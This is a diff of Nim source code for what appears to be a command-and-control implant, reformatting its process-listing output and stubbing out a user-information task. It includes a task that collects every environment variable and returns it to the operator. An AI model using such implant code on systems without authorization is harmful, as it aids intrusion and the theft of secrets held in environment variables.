@@ -58,7 +58,6 @@ when defined(agent):
         echo fmt"   [>] Listing running processes."
         
         try: 
-
             var processes: seq[DWORD] = @[]
             var procMap = initTable[DWORD, ProcessInfo]()
             var output: string = ""
@@ -98,6 +97,11 @@ when defined(agent):
                 else: 
                     processes.add(pid)
 
+            # Add header row
+            let headers = @["PID", "PPID", "Process"]
+            output &= fmt"{headers[0]:<10}{headers[1]:<10}{headers[2]:<25}" & "\n"
+            output &= "-".repeat(len(headers[0])).alignLeft(10) & "-".repeat(len(headers[1])).alignLeft(10) & "-".repeat(len(headers[2])).alignLeft(25) & "\n"
+
             # Format and print process
             proc printProcess(pid: DWORD, indentSpaces: int = 0) = 
                 if not procMap.contains(pid): 
@@ -106,9 +110,7 @@ when defined(agent):
                 var process = procMap[pid]
                 let indent = " ".repeat(indentSpaces) 
 
-                let tree = (indent & fmt"[{process.pid}]").alignLeft(30)
-
-                output &= fmt"{tree}{process.name:<25}" & "\n"
+                output &= fmt"{process.pid:<10}{process.ppid:<10}{indent}{process.name:<25}" & "\n"
 
                 # Recursively print child processes with indentation
                 process.children.sort()
@@ -125,6 +127,7 @@ when defined(agent):
         except CatchableError as err: 
             return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
 
+    import sugar
     proc executeEnv(config: AgentConfig, task: Task): TaskResult = 
 
         echo fmt"   [>] Displaying environment variables."
@@ -132,7 +135,8 @@ when defined(agent):
         try: 
             var envVars: string = ""
             for key, value in envPairs(): 
-                envVars &= fmt"{key}: {value}" & '\n'
+               envVars &= fmt"{key}: {value}" & '\n'
+               
             return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, envVars.toBytes())
 
         except CatchableError as err: 
@@ -143,8 +147,9 @@ when defined(agent):
         echo fmt"   [>] Getting user information."
 
         try: 
-            echo "whoami"
 
+            let message = "Not implemented"
+            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, message.toBytes())
 
         except CatchableError as err: 
             return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
